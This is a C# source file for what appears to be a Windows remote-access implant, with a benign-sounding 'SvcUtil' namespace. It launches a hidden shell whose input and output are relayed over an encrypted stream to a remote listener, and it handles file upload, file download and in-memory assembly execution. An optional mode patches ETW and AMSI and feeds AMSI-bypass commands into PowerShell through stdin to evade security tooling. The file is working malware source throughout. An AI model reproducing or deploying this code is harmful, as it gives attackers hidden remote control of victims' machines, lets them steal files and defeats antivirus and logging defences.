using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace SvcUtil
{
    internal static class Shell
    {
        // ── Win32 structs ────────────────────────────────────────────

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX, dwY, dwXSize, dwYSize;
            public int dwXCountChars, dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        // ── Session data (class, not struct — shared by threads) ─────

        internal sealed class SessionData
        {
            public IntPtr ReadPipeHandle;
            public IntPtr WritePipeHandle;
            public IntPtr ProcessHandle;
            public IShellStream Stream;
            public IntPtr ShellStdinPipe;
            public IntPtr ShellStdoutPipe;
            public volatile bool Running;
        }

        private const int STARTF_USESTDHANDLES = 0x00000100;
        private const int STARTF_USESHOWWINDOW = 0x00000001;
        private const short SW_HIDE = 0;
        private const int DUPLICATE_SAME_ACCESS = 0x2;
        // ── Core entry point ─────────────────────────────────────────

        /// <summary>
        /// Execute a command with I/O piped through the stream.
        /// </summary>
        public static bool Execute(string commandLine, IShellStream stream,
                                    bool patchScan = false)
        {
            var session = new SessionData { Stream = stream, Running = true };

            bool isPowerShell = patchScan && ScanPatch.IsPowerShell(commandLine);

            // Method 1: local process patch (ETW + AMSI in current process)
            if (patchScan)
                ScanPatch.PatchCurrentProcess();

            if (!CreateSession(commandLine, session))
                return false;

            if (isPowerShell)
            {
                // Wait for PowerShell to initialize and start reading stdin.
                // No CREATE_SUSPENDED, no cross-process memory writes —
                // just stdin reflection, each line individually passes AMSI.
                Thread.Sleep(500);

                ScanPatch.InjectViaStdin(session.WritePipeHandle);

                // Wait for PowerShell to process all bypass commands,
                // then drain the pipe to discard banner + command echoes.
                // This keeps the listener output clean.
                Thread.Sleep(400);
                DrainPipe(session.ReadPipeHandle);
            }

            // Reader thread: shell stdout → socket
            var reader = new Thread(() => ReadShellLoop(session))
            {
                IsBackground = true,
                Name = "ShellReader"
            };

            // Writer thread: socket → shell stdin
            var writer = new Thread(() => WriteShellLoop(session))
            {
                IsBackground = true,
                Name = "ShellWriter"
            };

            reader.Start();
            writer.Start();

            // Wait for child process to exit
            DynInvoke.WaitForSingleObject(session.ProcessHandle, -1);

            // Signal threads to stop and wait for them
            session.Running = false;
            reader.Join(2000);
            writer.Join(2000);

            Cleanup(session);
            return true;
        }

        // ── Process creation ─────────────────────────────────────────

        private static bool CreateSession(string commandLine, SessionData session)
        {
            var sa = new SECURITY_ATTRIBUTES
            {
                nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)),
                lpSecurityDescriptor = IntPtr.Zero,
                bInheritHandle = true
            };

            IntPtr pSa = Marshal.AllocHGlobal(Marshal.SizeOf(sa));
            Marshal.StructureToPtr(sa, pSa, false);

            try
            {
                IntPtr shellStdin = IntPtr.Zero;
                IntPtr shellStdout = IntPtr.Zero;

                // Pipe for shell stdin: we write → shell reads
                if (!DynInvoke.CreatePipe(ref shellStdin,
                                          ref session.WritePipeHandle, pSa, 0))
                    return false;

                // Pipe for shell stdout: shell writes → we read
                if (!DynInvoke.CreatePipe(ref session.ReadPipeHandle,
                                          ref shellStdout, pSa, 0))
                {
                    DynInvoke.CloseHandle(shellStdin);
                    return false;
                }

                session.ShellStdinPipe = shellStdin;
                session.ShellStdoutPipe = shellStdout;

                // Start the shell process
                if (!StartShell(commandLine, session))
                {
                    DynInvoke.CloseHandle(shellStdin);
                    DynInvoke.CloseHandle(shellStdout);
                    DynInvoke.CloseHandle(session.ReadPipeHandle);
                    DynInvoke.CloseHandle(session.WritePipeHandle);
                    return false;
                }

                // Close the child-side pipe handles in our process
                // (the child inherited them via CreateProcess)
                DynInvoke.CloseHandle(shellStdout);
                DynInvoke.CloseHandle(shellStdin);

                return true;
            }
            finally
            {
                Marshal.FreeHGlobal(pSa);
            }
        }

        private static bool StartShell(string commandLine, SessionData session)
        {
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpReserved = IntPtr.Zero;
            si.lpTitle = IntPtr.Zero;
            si.lpDesktop = IntPtr.Zero;
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            si.hStdInput = session.ShellStdinPipe;
            si.hStdOutput = session.ShellStdoutPipe;

            // Duplicate stdout handle for stderr
            IntPtr currentProc = DynInvoke.GetCurrentProcess();
            IntPtr hStdErr = IntPtr.Zero;

            if (!DynInvoke.DuplicateHandle(currentProc, session.ShellStdoutPipe,
                                            currentProc, ref hStdErr,
                                            0, true, DUPLICATE_SAME_ACCESS))
                return false;

            si.hStdError = hStdErr;

            PROCESS_INFORMATION pi;
            if (!DynInvoke.CreateProcessW(null, commandLine,
                                           IntPtr.Zero, IntPtr.Zero,
                                           true, 0, IntPtr.Zero, null,
                                           ref si, out pi))
            {
                DynInvoke.CloseHandle(hStdErr);
                return false;
            }

            // Close duplicated stderr handle in parent (child inherited it)
            DynInvoke.CloseHandle(hStdErr);

            session.ProcessHandle = pi.hProcess;
            DynInvoke.CloseHandle(pi.hThread);

            return true;
        }

        // ── I/O loop: shell stdout → encrypted socket ────────────────

        private static void ReadShellLoop(SessionData session)
        {
            byte[] pipeBuf = new byte[Config.BufferSize];

            while (session.Running)
            {
                int bytesRead, bytesAvailable;

                if (!DynInvoke.PeekNamedPipe(session.ReadPipeHandle,
                        pipeBuf, pipeBuf.Length,
                        out bytesRead, out bytesAvailable, IntPtr.Zero))
                    break;

                if (bytesAvailable <= 0)
                {
                    Thread.Sleep(50);
                    continue;
                }

                // Read exactly what is available (up to buffer size)
                int toRead = Math.Min(bytesAvailable, pipeBuf.Length);
                int actualRead;
                if (!DynInvoke.ReadFile(session.ReadPipeHandle,
                        pipeBuf, toRead, out actualRead, IntPtr.Zero))
                    break;

                if (actualRead <= 0) continue;

                // Send through encrypted stream
                if (!session.Stream.Send(pipeBuf, 0, actualRead))
                    break;
            }

            session.Running = false;
        }

        // ── I/O loop: encrypted socket → shell stdin ─────────────────

        private static void WriteShellLoop(SessionData session)
        {
            byte[] recvBuf = new byte[Config.BufferSize];
            // Line buffer to detect file transfer commands
            var lineBuilder = new StringBuilder(512);

            while (session.Running && session.Stream.Connected)
            {
                int received = session.Stream.Receive(recvBuf, 0, recvBuf.Length);
                if (received <= 0) break;

                // Scan for newlines to detect !upload / !download commands
                int segmentStart = 0;
                for (int i = 0; i < received; i++)
                {
                    if (recvBuf[i] == (byte)'\n' || recvBuf[i] == (byte)'\r')
                    {
                        // Append this segment to line builder
                        if (i > segmentStart)
                            lineBuilder.Append(Encoding.UTF8.GetString(
                                recvBuf, segmentStart, i - segmentStart));

                        string line = lineBuilder.ToString();
                        lineBuilder.Clear();
                        segmentStart = i + 1;

                        // Check for special commands (file transfer, assembly exec)
                        if (FileTransfer.TryHandle(line, session.Stream))
                            continue;
                        if (AssemblyRunner.TryHandle(line, session.Stream))
                            continue;

                        // Not a special command — forward the line + newline to shell
                        byte[] lineBytes = Encoding.UTF8.GetBytes(line + "\n");
                        int written;
                        DynInvoke.WriteFile(session.WritePipeHandle,
                            lineBytes, (uint)lineBytes.Length,
                            out written, IntPtr.Zero);
                    }
                }

                // Remaining data after last newline goes into line buffer
                if (segmentStart < received)
                {
                    lineBuilder.Append(Encoding.UTF8.GetString(
                        recvBuf, segmentStart, received - segmentStart));

                    // If no newline was found at all, and buffer is getting large,
                    // flush it directly to the shell (binary data / long command)
                    if (lineBuilder.Length > Config.BufferSize)
                    {
                        byte[] raw = Encoding.UTF8.GetBytes(lineBuilder.ToString());
                        lineBuilder.Clear();
                        int written;
                        DynInvoke.WriteFile(session.WritePipeHandle,
                            raw, (uint)raw.Length, out written, IntPtr.Zero);
                    }
                }
            }

            session.Running = false;
        }

        // ── Pipe drain (discard buffered output) ─────────────────────

        private static void DrainPipe(IntPtr pipeHandle)
        {
            byte[] buf = new byte[4096];
            while (true)
            {
                int bytesRead, bytesAvailable;
                if (!DynInvoke.PeekNamedPipe(pipeHandle, buf, buf.Length,
                        out bytesRead, out bytesAvailable, IntPtr.Zero))
                    break;

                if (bytesAvailable <= 0)
                    break;

                int actual;
                DynInvoke.ReadFile(pipeHandle, buf,
                    Math.Min(bytesAvailable, buf.Length),
                    out actual, IntPtr.Zero);
            }
        }

        // ── Cleanup ──────────────────────────────────────────────────

        private static void Cleanup(SessionData session)
        {
            session.Running = false;

            SafeClose(ref session.ReadPipeHandle);
            SafeClose(ref session.WritePipeHandle);
            SafeClose(ref session.ProcessHandle);

            try { if (session.Stream != null) session.Stream.Close(); } catch { }
        }

        private static void SafeClose(ref IntPtr handle)
        {
            if (handle != IntPtr.Zero)
            {
                DynInvoke.CloseHandle(handle);
                handle = IntPtr.Zero;
            }
        }
    }
}
